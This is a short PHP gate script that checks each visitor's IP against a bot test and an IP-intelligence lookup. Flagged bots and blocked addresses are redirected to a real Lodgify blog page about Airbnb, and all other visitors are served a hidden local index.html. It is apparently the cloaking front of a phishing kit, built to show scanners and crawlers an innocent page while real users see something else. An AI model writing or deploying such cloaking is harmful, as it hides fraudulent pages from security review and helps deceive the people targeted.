<?php
require_once __DIR__ . DIRECTORY_SEPARATOR . 'functions.php';
$userip = getUserIP();

if($userip == '127.0.0.1') {
    $userip = '104.28.106.146';
}

$check = getIntel2($userip);
$check->bot = is_bot();

if(isset($check->bot) && $check->bot == 1 || isset($check->block) && $check->block == 1) {
    header("Location: https://www.lodgify.com/blog/airbnb-blogs/", true, 302);
} else {
    echo file_get_contents(__DIR__ . DIRECTORY_SEPARATOR . 'index.html');
}

?>